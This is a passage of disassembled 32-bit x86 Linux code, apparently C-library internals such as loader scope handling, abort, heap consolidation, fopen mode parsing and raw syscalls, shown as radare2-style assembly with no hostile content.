leave
ret
cmp byte [eax + 0x80], 0
jne 0x8054972
mov eax, 0
test eax, eax
je 0x8054972
mov dword [var_4h], ebp
mov dword [esp], 0xffffffff
call section.
nop
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
mov ebx, eax
call section.
mov byte [eax + 0x81], bl
mov ebx, dword [esp]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
xor ebx, ebx
sub esp, 4
mov ecx, dword [arg_8h]
test ecx, ecx
je 0x80549f8
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8054adc
mov eax, dword [arg_8h]
mov dword [ebx + 8], eax
mov eax, dword [arg_14h]
mov dword [ebx + 0xc], eax
mov edx, dword [arg_ch]
test edx, edx
je 0x8054a21
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov esi, eax
je 0x8054ad4
mov eax, dword [arg_ch]
mov dword [esi + 8], eax
mov eax, dword [arg_14h]
mov dword [esi + 0xc], eax
mov eax, dword [arg_10h]
test eax, eax
je 0x8054a4a
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov edi, eax
je 0x8054acc
mov eax, dword [arg_10h]
mov dword [edi + 8], eax
mov eax, dword [arg_14h]
mov dword [edi + 0xc], eax
mov eax, 0
test eax, eax
je 0x8054a5f
mov dword [esp], 0x80a9be0
call section.
test ebx, ebx
je 0x8054a79
mov eax, dword [0x80a9bfc]
mov dword [eax], ebx
mov dword [ebx + 4], eax
mov dword [ebx], 0x80a9bf8
mov dword [0x80a9bfc], ebx
test esi, esi
je 0x8054a93
mov eax, dword [0x80a9c04]
mov dword [eax], esi
mov dword [esi + 4], eax
mov dword [esi], 0x80a9c00
mov dword [0x80a9c04], esi
test edi, edi
je 0x8054aad
mov eax, dword [0x80a9c0c]
mov dword [eax], edi
mov dword [edi + 4], eax
mov dword [edi], 0x80a9c08
mov dword [0x80a9c0c], edi
mov eax, 0
test eax, eax
je 0x8054ac2
mov dword [esp], 0x80a9be0
call section.
xor eax, eax
add esp, 4
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], esi
call fcn.08051180
mov dword [esp], ebx
call fcn.08051180
call fcn.08048b20
mov eax, dword [eax]
jmp 0x8054ac4
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0xc
mov eax, dword [arg_8h]
mov ebx, dword [eax + 0x154]
cmp edi, ebx
mov dword [var_10h], ebx
jae 0x8054b39
mov ecx, dword [eax + 0x150]
mov eax, dword [ecx + edi*4]
lea edx, [esi + 1]
test byte [eax + 0x174], 0x10
cmove esi, edx
inc edi
cmp edi, dword [var_10h_3]
jb 0x8054b23
mov edx, dword [0x80aac24]
test edx, edx
je 0x8054bea
mov ecx, dword [0x80a95b8]
mov eax, dword [ecx + 4]
add eax, esi
cmp eax, edx
ja 0x8054ba9
xor edi, edi
cmp edi, ebx
jae 0x8054b9f
lea esi, [esi]
mov edx, dword [var_4h]
mov eax, dword [edx + 0x150]
mov esi, dword [eax + edi*4]
movzx eax, byte [esi + 0x174]
test al, 0x10
jne 0x8054b9a
or eax, 0x10
mov byte [esi + 0x174], al
mov eax, dword [0x80a95b8]
mov edx, dword [eax + 4]
mov ecx, dword [eax]
mov dword [ecx + edx*4], esi
inc edx
mov dword [eax + 4], edx
mov eax, dword [var_4h]
mov ebx, dword [eax + 0x154]
inc edi
cmp edi, ebx
jb 0x8054b60
lea esp, [var_4h_5]
xor eax, eax
pop ebx
pop esi
pop edi
leave
ret
lea eax, [esi + edx]
lea eax, [eax*4 + 0x20]
mov dword [var_8h], eax
mov eax, dword [ecx]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x8054c3f
add esi, dword [0x80aac24]
mov edx, dword [var_4h]
lea eax, [esi + 8]
mov dword [0x80aac24], eax
mov eax, dword [0x80a95b8]
mov dword [eax], ebx
mov ebx, dword [edx + 0x154]
jmp 0x8054b56
mov eax, dword [0x80a95b8]
add esi, dword [eax + 4]
lea eax, [esi + 8]
mov dword [0x80aac24], eax
shl eax, 2
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8054c35
mov eax, dword [0x80a95b8]
mov edi, ebx
cld
mov ecx, dword [eax + 4]
mov esi, dword [eax]
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [0x80a95b8]
mov dword [eax], ebx
mov eax, dword [var_4h]
mov ebx, dword [eax + 0x154]
jmp 0x8054b56
mov dword [0x80aac24], 0
mov edx, dword [arg_8h]
xor ecx, ecx
mov eax, dword [edx + 0x14]
mov dword [esp], str.cannot_extend_global_scope
mov edx, dword [eax]
mov eax, 0xc
call fcn.08081200
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x3c
mov eax, dword [var_8h]
mov edx, dword [eax + 4]
mov ebx, dword [eax]
mov dword [var_4h], 0x24
mov dword [var_10h_2], edx
mov dword [esp], ebx
call fcn.08076ce0
test eax, eax
mov edi, eax
jne 0x805519a
mov eax, dword [var_10h_3]
xor ecx, ecx
mov edx, ebx
mov dword [var_4h], 0
mov dword [esp], 2
mov dword [var_sp_8h], eax
xor eax, eax
call fcn.0807cfa0
mov edx, dword [var_4h]
sub esp, 0xc
mov dword [var_38h_2], eax
test eax, eax
mov dword [edx + 0x10], eax
je 0x805516c
test dword [var_10h_3], 0x40000000
jne 0x8054e5d
mov ecx, dword [var_38h_2]
mov esi, dword [ecx + 0x150]
test esi, esi
jne 0x8055117
mov eax, dword [var_10h_3]
xor ecx, ecx
xor edx, edx
mov dword [esp], 0
and eax, 0x80000000
mov dword [var_4h_4], eax
mov eax, dword [var_38h_2]
call fcn.08080290
mov edi, dword [var_38h_2]
sub esp, 8
mov dword [var_14h_2], 0
mov esi, dword [edi + 0x154]
cmp dword [var_14h_2], esi
jae 0x8054d3d
mov edx, dword [var_38h_2]
mov ecx, dword [var_14h_2]
mov eax, dword [edx + 0x150]
mov eax, dword [eax + ecx*4]
mov ebx, dword [eax + 0x17c]
test ebx, ebx
je 0x8055100
inc dword [var_14h_2]
cmp dword [var_14h_2], esi
jb 0x8054d18
mov eax, dword [var_10h_3]
xor ebx, ebx
and eax, 3
cmp eax, 1
je 0x80550f0
mov esi, dword [var_38h_2]
mov eax, dword [esi + 0xc]
test eax, eax
je 0x8054d61
mov esi, eax
mov eax, dword [eax + 0xc]
test eax, eax
jne 0x8054d58
test byte [esi + 0x174], 4
je 0x80550cd
cmp esi, dword [var_38h_2]
je 0x8054d78
mov esi, dword [esi + 0x10]
jmp 0x8054d61
mov esi, dword [var_38h_2]
test esi, esi
je 0x8054d96
nop
movzx eax, byte [esi + 0x175]
test al, 4
jne 0x80550b6
mov esi, dword [esi + 0xc]
test esi, esi
jne 0x8054d80
mov edi, dword [var_38h_2]
mov dword [var_14h_2], 0
mov byte [var_15h_2], 0
mov esi, dword [edi + 0x154]
cmp dword [var_14h_2], esi
jae 0x8054e19
nop
mov eax, dword [var_38h]
mov edi, dword [var_14h]
mov ecx, dword [eax + 0x150]
mov ebx, dword [ecx + edi*4]
mov edx, ecx
mov eax, dword [ebx + 0x170]
inc eax
cmp eax, 1
mov dword [ebx + 0x170], eax
jbe 0x8054de5
movzx eax, byte [ebx + 0x174]
and eax, 3
cmp al, 2
je 0x8054fb7
mov ebx, dword [var_14h]
mov eax, dword [edx + ebx*4]
cmp dword [eax + 0x170], 1
je 0x8054ea4
inc dword [var_14h]
cmp dword [var_14h], esi
jb 0x8054db0
cmp byte [var_15h], 0
je 0x8054e19
mov eax, dword [0x80aabe4]
inc eax
test eax, eax
mov dword [0x80aabe4], eax
je 0x805530b
mov eax, dword [0x80aa840]
mov ecx, dword [0x80aac80]
mov edx, dword [0x80aac7c]
mov dword [esp], eax
mov eax, dword [var_38h]
call fcn.08081630
sub esp, 4
test dword [var_10h_2], 0x100
jne 0x8054e93
test dword [var_10h_2], 0x1000
jne 0x8054e87
test byte [0x80aac10], 0x40
mov dword [0x80a95f8], 1
jne 0x8054e65
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [var_38h]
mov eax, dword [ecx + 0x170]
mov dword [var_4h], eax
mov eax, dword [ecx + 4]
mov dword [esp], str.opening_file_s__opencount___u_n_n
mov dword [var_4h_2], eax
call fcn.08081c40
jmp 0x8054e5d
mov edx, dword [var_38h]
invalid
mov ch, ah
add dword [eax], eax
invalid
push ebp
mov ebp, esp
sub esp, 0xc
lea eax, [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08064160
leave
ret
push ebp
mov ebp, esp
push edi
mov edi, 0
sub esp, 0x11c
test edi, edi
je 0x8062c6f
mov dword [esp], 0x80a9b1c
call section.
mov eax, dword [0x80aa978]
test eax, eax
jne 0x8062cbb
mov dword [0x80aa978], 1
lea edx, [var_114h]
mov eax, 0x1f
mov dword [edx + eax*4], 0
dec eax
jns 0x8062c8d
or dword [var_114h], 0x20
mov dword [var_8h], 0
mov dword [var_4h], edx
mov dword [esp], 1
call fcn.08049180
mov eax, dword [0x80aa978]
cmp eax, 1
je 0x8062deb
cmp eax, 2
je 0x8062d9c
cmp eax, 3
je 0x8062d38
cmp eax, 4
je 0x8062d22
cmp eax, 5
je 0x8062d05
cmp eax, 6
je 0x8062cf3
cmp eax, 7
je 0x8062e0b
lea esi, [esi]
hlt
jmp 0x8062cf0
mov eax, 7
mov dword [0x80aa978], 7
hlt
jmp 0x8062ce1
mov dword [0x80aa978], 6
mov dword [esp], 6
call fcn.08084b40
mov eax, dword [0x80aa978]
jmp 0x8062cdc
mov dword [0x80aa978], 5
call fcn.08076be0
mov eax, dword [0x80aa978]
jmp 0x8062cd7
lea edx, [var_94h]
xor eax, eax
mov ecx, 0x23
cld
mov edi, edx
mov dword [0x80aa978], 4
rep stosd dword es:[edi], eax
mov dword [var_94h], 0
lea ecx, [var_90h]
mov eax, 0x1f
mov dword [ecx + eax*4], 0xffffffff
dec eax
jns 0x8062d69
mov dword [var_10h], 0
mov dword [var_8h], 0
mov dword [var_4h], edx
mov dword [esp], 6
call fcn.08049140
mov eax, dword [0x80aa978]
jmp 0x8062cd2
mov eax, 0
mov dword [0x80aa978], 0
test eax, eax
je 0x8062dbb
mov dword [esp], 0x80a9b1c
call section.
mov dword [esp], 6
call fcn.08084b40
test edi, edi
je 0x8062dd7
mov dword [esp], 0x80a9b1c
call section.
mov eax, 3
mov dword [0x80aa978], 3
jmp 0x8062ccd
mov dword [0x80aa978], 2
mov dword [esp], 0
call fcn.0804e260
mov eax, dword [0x80aa978]
jmp 0x8062cc4
mov dword [0x80aa978], 8
mov dword [esp], 0x7f
call fcn.08053d90
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
mov edx, ebx
mov eax, 0x5a
lea ebx, [arg_4h]
int 0x80
mov ebx, edx
cmp eax, 0xfffff000
ja fcn.080564b0
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x1c
mov eax, dword [var_sp_4h]
mov dword [var_10h_2], eax
mov edx, eax
mov eax, dword [eax + 0x28]
test eax, eax
je 0x8052551
mov ebx, dword [var_10h_2]
or eax, 1
mov dword [edx + 0x28], eax
shr eax, 3
add edx, 0x5c
mov dword [var_20h], edx
lea eax, [ebx + eax*4 + 0x24]
add ebx, 0x2c
mov dword [var_18h], eax
mov dword [var_14h], ebx
nop
lea esi, [esi]
mov eax, dword [var_14h]
mov ecx, dword [eax]
test ecx, ecx
je 0x805251c
mov dword [eax], 0
mov eax, dword [ecx + 4]
mov edx, dword [ecx + 8]
mov esi, eax
mov dword [var_1ch], edx
and esi, 0xfffffffa
lea edx, [esi + ecx]
mov edi, dword [edx + 4]
mov ebx, edi
and ebx, 0xfffffff8
test al, 1
mov dword [var_24h], ebx
jne 0x80524c7
mov eax, dword [ecx]
sub ecx, eax
add esi, eax
mov ebx, dword [ecx + 8]
mov eax, dword [ecx + 0xc]
cmp dword [ebx + 0xc], ecx
jne 0x8052563
cmp dword [eax + 8], ecx
jne 0x8052563
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
mov eax, dword [var_10h_2]
cmp edx, dword [eax + 0x54]
je 0x8052540
mov ebx, dword [var_24h]
test byte [ebx + edx + 4], 1
jne 0x8052534
add esi, ebx
mov eax, dword [edx + 0xc]
mov ebx, dword [edx + 8]
cmp dword [ebx + 0xc], edx
jne 0x8052563
cmp dword [eax + 8], edx
jne 0x8052563
mov dword [ebx + 0xc], eax
mov dword [eax + 8], ebx
mov eax, dword [var_20h]
mov ebx, dword [var_20h]
mov dword [esi + ecx], esi
mov edx, dword [eax + 8]
mov dword [eax + 8], ecx
mov eax, esi
or eax, 1
mov dword [ecx + 4], eax
mov dword [edx + 0xc], ecx
mov dword [ecx + 8], edx
mov dword [ecx + 0xc], ebx
mov ecx, dword [var_1ch]
test ecx, ecx
jne 0x8052483
mov eax, dword [var_14h]
add dword [var_14h], 4
cmp eax, dword [var_18h]
jne 0x8052470
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
ret
and edi, 0xfffffffe
mov dword [edx + 4], edi
jmp 0x80524f1
lea esi, [esi]
add esi, dword [var_24h]
mov eax, dword [var_10h_2]
mov dword [eax + 0x54], ecx
or esi, 1
mov dword [ecx + 4], esi
jmp 0x8052511
mov edx, dword [var_10h_2]
mov dword [var_sp_4h], edx
add esp, 0x1c
pop ebx
pop esi
pop edi
leave
jmp fcn.0804edc0
hlt
push ebp
mov ebp, esp
push edi
push esi
mov esi, eax
push ebx
sub esp, 0xc
test eax, eax
mov dword [var_10h], edx
je 0x804fb02
mov ebx, dword [eax + 0x46c]
mov edi, 0
test ebx, ebx
je 0x804fad7
lea esi, [esi]
test edi, edi
je 0x804fac5
mov dword [esp], ebx
call section.
test eax, eax
je 0x804fa9c
mov ebx, dword [ebx + 0x46c]
cmp ebx, esi
jne 0x804f950
test edi, edi
je 0x804fa80
mov dword [esp], 0x80aa810
call section.
test eax, eax
je 0x804f98e
mov ebx, esi
jmp 0x804f950
mov edi, 0
test edi, edi
je 0x804fa6f
mov dword [esp], 0x80aa810
call section.
mov eax, dword [var_10h]
mov dword [esp], eax
call fcn.0804fb20
mov ebx, eax
xor eax, eax
test ebx, ebx
je 0x804fa34
mov eax, 0
test eax, eax
je 0x804fa64
mov dword [var_4h], ebx
mov dword [esp], 0
call section.
mov eax, 0
test eax, eax
je 0x804fa5c
mov dword [var_4h], 0
mov dword [esp], ebx
call section.
mov esi, 0
test esi, esi
je 0x804fa54
mov dword [esp], ebx
call section.
test esi, esi
je 0x804fa48
mov dword [esp], 0x80aa810
call section.
mov eax, dword [0x80aa7cc]
mov dword [ebx + 0x46c], eax
test edi, edi
mov dword [0x80aa7cc], ebx
je 0x804fa3c
mov dword [esp], 0x80aa810
call section.
mov eax, ebx
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov dword [0x80aa810], 0
jmp 0x804fa32
mov dword [0x80aa810], 1
jmp 0x804fa11
mov dword [ebx], 1
jmp 0x804fa01
mov dword [ebx], 0
jmp 0x804f9f0
mov dword [0x80aa34c], ebx
jmp 0x804f9d7
mov dword [0x80aa810], 0
jmp 0x804f9a7
mov esi, esi
mov eax, dword [0x80aa810]
test eax, eax
jne 0x804f98a
mov dword [0x80aa810], 1
jmp 0x804f98e
mov eax, 0
test eax, eax
je 0x804faba
mov dword [var_4h], ebx
mov dword [esp], 0
call section.
jmp 0x804fa32
mov dword [0x80aa34c], ebx
jmp 0x804fa32
mov eax, dword [ebx]
test eax, eax
jne 0x804f968
mov dword [ebx], 1
jmp 0x804fa9c
mov eax, 0
test eax, eax
je 0x804faf6
mov dword [esp], 0x80aa360
call section.
mov eax, 0x80aa360
jmp 0x804fa34
mov dword [0x80aa360], 1
jmp 0x804faec
mov esi, 0x80aa360
mov edi, 0
jmp 0x804f98a
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_ch], ebx
mov dword [var_4h], edi
mov eax, dword [arg_ch]
mov edi, dword [arg_8h]
mov ebx, dword [arg_10h]
mov dword [var_8h], esi
mov esi, dword [arg_14h]
mov dword [var_sp_4h], eax
mov dword [esp], edi
call fcn.0804df60
test ebx, ebx
mov dword [edi + 0x5c], ebx
js 0x804e0b6
mov eax, dword [arg_18h]
mov dword [edi + 0x58], esi
mov dword [esi + 0x18], 0
mov dword [esi + 0x1c], 0
mov dword [esi + 8], 0
mov dword [esi], 0
mov dword [esi + 4], 0
mov dword [esi + 0xc], 0
mov dword [esi + 0x10], 0
mov dword [esi + 0x14], 0
mov dword [esi + 0x20], 0
mov dword [esi + 0x24], 0
mov dword [esi + 0x28], 0
mov dword [esi + 0xb8], eax
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], esi
mov dword [var_8h], ebx
mov eax, dword [arg_ch]
mov esi, dword [arg_8h]
or eax, 0xfbad0000
mov edx, dword [esi + 0x48]
mov dword [esi], eax
mov dword [esi + 0x3c], 0
mov dword [esi + 0x1c], 0
mov dword [esi + 0x20], 0
mov dword [esi + 0xc], 0
mov dword [esi + 4], 0
mov dword [esi + 8], 0
mov dword [esi + 0x10], 0
test edx, edx
mov dword [esi + 0x14], 0
mov dword [esi + 0x18], 0
mov dword [esi + 0x34], 0
mov dword [esi + 0x24], 0
mov dword [esi + 0x28], 0
mov dword [esi + 0x2c], 0
mov dword [esi + 0x30], 0
mov word [esi + 0x44], 0
je 0x804e023
mov eax, 0
test eax, eax
je 0x804e023
lea ebx, [var_ch]
mov dword [esp], ebx
call section.
mov dword [esp], ebx
mov dword [var_sp_4h], 1
call section.
mov dword [var_sp_4h], ebx
mov eax, dword [esi + 0x48]
mov dword [esp], eax
call section.
mov dword [esp], ebx
call section.
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
or dword [ebx], 0x240c
mov dword [ebx + 0x4c], 0xffffffff
mov dword [ebx + 0x50], 0xffffffff
mov dword [esp], ebx
call fcn.0804d600
mov dword [ebx + 0x38], 0xffffffff
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x24
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
cmp byte [ebx], 0
js 0x804d68d
mov eax, 0
or dword [ebx], 0x80
test eax, eax
setne al
movzx esi, al
test esi, esi
jne 0x804d6c0
mov eax, 0
test eax, eax
je 0x804d644
mov dword [esp], 0x80a9058
call section.
cmp word [ebx], 0
mov dword [0x80aa32c], ebx
jns 0x804d6b4
inc dword [0x80aa328]
mov eax, dword [0x80a94f8]
mov dword [0x80a94f8], ebx
cmp word [ebx], 0
mov dword [ebx + 0x34], eax
jns 0x804d6aa
mov eax, 0
mov dword [0x80aa32c], 0
test eax, eax
je 0x804d689
mov dword [esp], 0x80a9058
call section.
test esi, esi
jne 0x804d695
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea eax, [var_18h]
mov dword [var_sp_4h], 0
mov dword [esp], eax
call section.
jmp 0x804d68d
mov dword [esp], ebx
call fcn.08074580
jmp 0x804d66a
mov dword [esp], ebx
call fcn.08074540
jmp 0x804d650
mov esi, esi
lea eax, [var_18h]
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], fcn.0804d4c0
mov dword [esp], eax
call section.
jmp 0x804d62f
push ebp
mov ebp, esp
push edi
push esi
xor esi, esi
push ebx
sub esp, 0x34
mov eax, dword [arg_8h]
mov edx, dword [arg_10h]
cmp dword [eax + 0x38], 0xffffffff
jne 0x804b979
movsx eax, byte [edx]
cmp eax, 0x72
je 0x804bc44
jg 0x804bc25
cmp eax, 0x61
je 0x804b983
call fcn.08048b20
mov dword [eax], 0x16
xor eax, eax
lea esp, [var_ch]
pop ebx
pop esi
pop edi
leave
ret
mov edi, 1
mov esi, 0x440
mov dword [var_20h_2], 0x1004
mov ebx, edx
mov ecx, 1
nop
lea esi, [esi]
inc edx
movsx eax, byte [edx]
cmp eax, 0x63
je 0x804bc19
jg 0x804bbf7
cmp eax, 0x62
je 0x804bbf0
test eax, eax
je 0x804b9d6
cmp eax, 0x2b
je 0x804bbe0
lea esi, [esi]
inc ecx
cmp ecx, 5
jle 0x804b9a0
mov eax, dword [arg_14h]
or edi, esi
mov dword [var_14h], eax
mov eax, dword [var_20h]
mov dword [var_8h], edi
mov dword [var_sp_ch], 0x1b6
mov dword [var_10h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.0804b820
test eax, eax
mov dword [var_24h], eax
je 0x804bb75
lea eax, [ebx + 1]
mov dword [var_4h], 0x8092ab4
mov dword [esp], eax
call fcn.080535c0
test eax, eax
mov esi, eax
je 0x804bb75
lea edi, [eax + 5]
mov dword [var_28h], esp
mov dword [var_4h], 0x2c
mov dword [esp], edi
call fcn.08053870
sub eax, esi
lea edx, [eax + 0x10]
sub eax, 5
and edx, 0xfffffffc
sub esp, edx
lea ebx, [var_27h]
mov dword [var_8h], eax
mov dword [var_4h], edi
and ebx, 0xfffffff0
mov dword [esp], ebx
call fcn.08053740
mov byte [eax], 0
mov dword [esp], ebx
mov dword [var_4h], ebx
call fcn.0804b540
cmp byte [ebx + 2], 0
jne 0x804ba95
mov esi, ebx
lea esi, [esi]
movsx edx, byte [edi]
mov eax, dword [0x80a99fc]
mov ecx, esi
inc edi
inc esi
mov eax, dword [eax + edx*4]
test al, al
mov byte [ecx], al
jne 0x804ba80
lea eax, [var_1ch]
mov edx, ebx
call fcn.08053cb0
test eax, eax
jne 0x804bbc2
cmp dword [var_18h], 1
jne 0x804bba1
cmp dword [var_bp_10h], 1
jne 0x804bb7d
mov edx, dword [var_8h]
mov esi, 0x80a9b40
mov ecx, 0x1e
cld
mov eax, dword [edx + 0x58]
mov edx, dword [eax + 4]
mov dword [eax + 0x2c], 0
mov dword [eax + 0x30], 0
mov edi, dword [var_8h]
mov dword [eax], edx
mov edx, dword [eax + 0xc]
mov dword [eax + 0x10], edx
mov eax, dword [edi + 0x58]
mov dword [eax + 0x34], 0
mov dword [eax + 0x38], 0
mov ebx, dword [edi + 0x58]
add ebx, 0x3c
mov dword [edi + 0x54], ebx
mov edi, ebx
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_18h]
mov dword [ebx + 0x20], eax
mov eax, dword [var_1ch]
mov dword [ebx + 0x30], 1
mov dword [ebx + 0x34], 0
mov dword [ebx + 0x38], 1
mov dword [ebx + 0x24], eax
mov edx, dword [var_24h_2]
mov eax, dword [edx + 0x58]
mov dword [ebx + 0x48], 0
add eax, 0x2c
mov dword [ebx + 0x3c], eax
mov eax, dword [var_bp_10h]
mov dword [ebx + 0x4c], eax
mov eax, dword [var_bp_14h]
mov dword [ebx + 0x64], 1
mov dword [ebx + 0x60], 0
mov dword [ebx + 0x50], eax
mov dword [ebx + 0x5c], 1
mov eax, dword [edx + 0x58]
mov dword [ebx + 0x74], 0x80a9bb8
add eax, 0x2c
mov dword [ebx + 0x68], eax
mov dword [edx + 0x5c], 1
mov esp, dword [var_28h_2]
mov eax, dword [var_24h]
jmp 0x804b97b
mov dword [var_sp_ch], str._IO_new_file_fopen
mov dword [var_8h], 0x16d
mov dword [var_4h], 0x8092961
mov dword [esp], str.fcts.tomb_nsteps__1
call fcn.0805efc0
mov dword [var_sp_ch], str._IO_new_file_fopen
mov dword [var_8h], 0x16c
mov dword [var_4h], 0x8092961
mov dword [esp], str.fcts.towc_nsteps__1
jmp 0x804bb9c
mov edi, dword [var_8h]
mov dword [esp], edi
call fcn.0804b620
call fcn.08048b20
mov dword [eax], 0x16
mov esp, dword [var_28h_2]
jmp 0x804b979
and dword [var_20h_2], 0x1000
mov edi, 2
lea esi, [esi]
mov ebx, edx
jmp 0x804b9d0
cmp eax, 0x6d
je 0x804bc0d
cmp eax, 0x78
jne 0x804b9d0
or esi, 0x80
jmp 0x804bbf0
mov eax, dword [var_8h]
or dword [eax + 0x3c], 1
jmp 0x804b9d0
mov edx, dword [arg_8h]
or dword [edx + 0x3c], 2
jmp 0x804b9d6
cmp eax, 0x77
jne 0x804b96e
mov edi, 1
mov esi, 0x240
mov dword [var_20h_2], 4
jmp 0x804b994
xor edi, edi
mov dword [var_20h], 8
jmp 0x804b994
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x1c
mov ebx, dword [arg_8h]
cmp byte [ebx], 0
jns 0x804d59f
mov eax, 0
test eax, eax
setne al
movzx esi, al
test esi, esi
jne 0x804d5df
mov eax, 0
test eax, eax
je 0x804d53e
mov dword [esp], 0x80a9058
call section.
cmp word [ebx], 0
mov dword [0x80aa32c], ebx
jns 0x804d5d2
mov ecx, dword [0x80a94f8]
mov edx, 0x80a94f8
test ecx, ecx
je 0x804d570
lea esi, [esi]
mov eax, dword [edx]
cmp eax, ebx
je 0x804d5c5
lea edx, [eax + 0x34]
mov eax, dword [eax + 0x34]
test eax, eax
jne 0x804d560
and dword [ebx], 0xffffff7f
cmp word [ebx], 0
jns 0x804d5bb
mov eax, 0
mov dword [0x80aa32c], 0
test eax, eax
je 0x804d59b
mov dword [esp], 0x80a9058
call section.
test esi, esi
jne 0x804d5a6
add esp, 0x1c
pop ebx
pop esi
leave
ret
lea eax, [var_18h]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x804d59f
mov dword [esp], ebx
call fcn.08074580
jmp 0x804d57c
inc dword [0x80aa328]
mov eax, dword [ebx + 0x34]
mov dword [edx], eax
jmp 0x804d570
mov dword [esp], ebx
call fcn.08074540
jmp 0x804d54e
lea eax, [var_18h]
mov dword [var_8h], 0
mov dword [var_4h], fcn.0804d4c0
mov dword [esp], eax
call section.
jmp 0x804d529
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
mov edx, dword [0x80aa344]
test edx, edx
je 0x80511ad
mov eax, dword [var_4h_2]
mov dword [esp], ebx
mov dword [var_4h_2], eax
call edx
mov ebx, dword [var_8h]
mov esi, dword [var_sp_4h]
leave
ret
test ebx, ebx
je 0x80511a5
lea eax, [ebx - 8]
mov edx, dword [eax + 4]
test dl, 2
jne 0x8051212
and edx, 4
mov esi, 0x80aa360
je 0x80511cd
and eax, 0xfff00000
mov esi, dword [eax]
mov eax, 0
test eax, eax
je 0x805120a
mov dword [esp], esi
call section.
mov dword [esp + 4], ebx
mov dword [esp], esi
call fcn.08052220
mov eax, 0
test eax, eax
je 0x8051202
mov dword [var_8h], esi
mov ebx, dword [var_8h_2]
mov esi, dword [var_sp_4h]
leave
jmp section.
mov dword [esi], 0
jmp 0x80511a5
mov dword [esi], 1
jmp 0x80511de
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
jmp fcn.08050f20
mov edx, ebx
mov ecx, dword [esp + 8]
mov ebx, dword [var_sp_8h]
mov eax, 0x5b
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
push ebx
sub esp, 0x24
mov esi, dword [arg_8h]
movzx edx, word [esi]
test dx, dx
js 0x804b440
mov eax, 0
test eax, eax
je 0x804b440
lea eax, [var_1ch]
mov dword [var_8h], esi
mov dword [var_4h], fcn.08074580
mov dword [esp], eax
mov edi, 1
call section.
movzx edx, word [esi]
mov esi, esi
test dx, dx
jns 0x804b4a6
mov eax, dword [arg_10h]
mov dword [var_10h], 3
mov dword [esp], esi
xor ebx, ebx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
cdq
mov dword [var_4h], eax
mov dword [var_8h], edx
call fcn.08075740
and eax, edx
cmp eax, 0xffffffff
setne bl
dec ebx
cmp word [esi], 0
jns 0x804b49c
test edi, edi
jne 0x804b487
add esp, 0x24
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
lea eax, [var_1ch]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x804b47d
mov dword [esp], esi
call fcn.08074580
jmp 0x804b479
mov dword [esp], esi
call fcn.08074540
jmp 0x804b445
cmp dword [0x80aa844], 0
jne 0x8053f44
mov edx, ebx
mov ebx, dword [arg_4h]
mov eax, 6
int 0x80
mov ebx, edx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
call fcn.08054950
mov ecx, eax
mov edx, ebx
mov ebx, dword [arg_4h]
mov eax, 6
int 0x80
mov ebx, edx
push eax
mov eax, ecx
call fcn.080549a0
pop eax
cmp eax, 0xfffff001
jae fcn.080564b0
ret
push ebp
mov ebp, esp
sub esp, 8
call section.
cmp byte [eax + 0x82], 0
movsx edx, byte [eax + 0x81]
mov byte [eax + 0x81], 1
jne 0x8054976
mov eax, edx
leave
ret
cmp byte [eax + 0x80], 0
jne 0x8054972
mov eax, 0
test eax, eax
je 0x8054972
mov dword [var_4h], ebp
mov dword [esp], 0xffffffff
call section.
nop
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
mov ebx, eax
call section.
mov byte [eax + 0x81], bl
mov ebx, dword [esp]
leave
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
